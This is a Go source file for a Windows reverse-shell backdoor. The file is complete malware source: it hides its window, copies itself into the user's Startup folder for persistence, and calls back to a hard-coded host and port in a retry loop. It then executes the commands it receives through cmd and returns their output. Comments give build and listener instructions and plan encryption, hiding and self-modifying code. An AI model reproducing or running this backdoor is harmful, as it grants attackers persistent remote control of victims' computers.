package main

/* 
Build with go build -ldflags -H=windowsgui WindowsReverseShell.go
Rename the payload to a.exe
Payload dials back to 192.168.50.39 on port 1234 on line 100
For the host, currently you can use "nc -nlvp 1234" (Linux host)

Backdoor logic as of now:
Checks to see if the program is in C drive
If not, copy the program to C drive and execute it there
If it is, execute and create reverse shell to host

TODO:
Persistent with Boot - Done!
Encryption
Hidden
Self modifying? (Code shuffle!)
*/

import (
   "bufio"
   "net"
   "os/exec"
   "syscall"
   "time"
   "path/filepath"
   "strings"
   "os/user"
   "os"
   "io"
)

/* 
Copy function will attempt to copy the payload into the victim's machine.
This is the copy function, takes in the source of the payload, and the destination.
*/
func copy(src, dst string) {
    in, _ := os.Open(src)
    defer in.Close()
    out, _ := os.Create(dst)
    defer out.Close()
    io.Copy(out, in)
}

/* 
Networking function that calls back to the host with a "shell"
Goal: Be persistent, don't let me die!
*/
func reverse(host string) {

   c, err := net.Dial("tcp", host)
   if nil != err {
      if nil != c {
         c.Close()
      }
      // Sleep 5 seconds if it can't call back to host, recall afterwards.
      time.Sleep(5 * time.Second)
      reverse(host)
   }

   r := bufio.NewReader(c)

   for {
      order, err := r.ReadString('\n')
      if nil != err {
         c.Close()
         reverse(host)
         return
      }
      
      // This took way to long to figure out, DOS commands are now working, but are not persistent.
      cmd := exec.Command("cmd", "/C", order)
      // Not sure if this does anything, check first comment about compiling.
      cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
      out, _ := cmd.CombinedOutput()
      c.Write(out)

   }
}

// Checks if the payload is in the victim's C drive
func checkPayloadInVictim() bool{

  // Get user directory
  dir, _ := filepath.Abs(filepath.Dir(os.Args[0]))

  if strings.Contains(dir, "C:\\Users"){
    return true
  } else {
    return false
  }

}

func main() {

  // Makes sure the payload is within the desired position
  if checkPayloadInVictim(){
    reverse("192.168.50.39:1234")
  } else {

    // Create the file path for the payload
    usr, _ := user.Current()
    target := usr.HomeDir + "\\Start Menu\\Programs\\Startup\\a.exe"

    // Copy payload to the intended target
    copy("a.exe", target)

    // Execute payload on new target
    cmd := exec.Command(target)
    cmd.Start()

  }
}
